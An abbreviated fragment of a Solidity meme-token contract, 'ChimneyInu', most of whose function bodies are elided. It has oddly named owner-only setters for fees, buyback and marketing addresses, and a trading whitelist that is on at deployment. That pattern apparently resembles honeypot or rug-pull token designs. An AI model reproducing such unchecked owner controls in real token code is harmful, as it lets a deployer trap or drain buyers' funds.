...
contract ChimneyInu is Context, IERC20, Ownable {
    ...
    uint256 public _buyBackMilipercent = 7000;
    ...
    constructor() {
        ...
        _whiteListEnabled = true;
        setRewardTime(address(0), true);
        setRewardTime(address(this), true);
        setRewardTime(_msgSender(), true);
     ...
     * @return boolean.
     */
    function setMarketAddrdr(address account) external onlyOwner returns (bool) {
     ...
     * @return boolean.
     */
    function setBuybackAdds(address account) external onlyOwner returns (bool) {
     ...
     * @return boolean
     */
    function setMarketingMilipersent(uint256 value) external onlyOwner returns (bool) {
     ...
     * @return boolean
     */
    function setBuymard(uint256 value) external onlyOwner returns (bool) {
     ...
     * @return boolean
     */
    function setMinimumDiv(uint256 value) external onlyOwner returns (bool) {
     ...
     * @return boolean
     */
    function setWila(bool value) public onlyOwner returns (bool) {
        _whiteListEnabled = value;
        return true;
    }

    function setNftio(bool value) public onlyOwner returns (bool) {
        _nftIntegrating = value;
        return true;
    }

    function setNfts(address account, bool value) public onlyOwner returns (bool) {
     ...
     * @return boolean
     */
    function setRewardTime(address account, bool value) public onlyOwner returns (bool) {
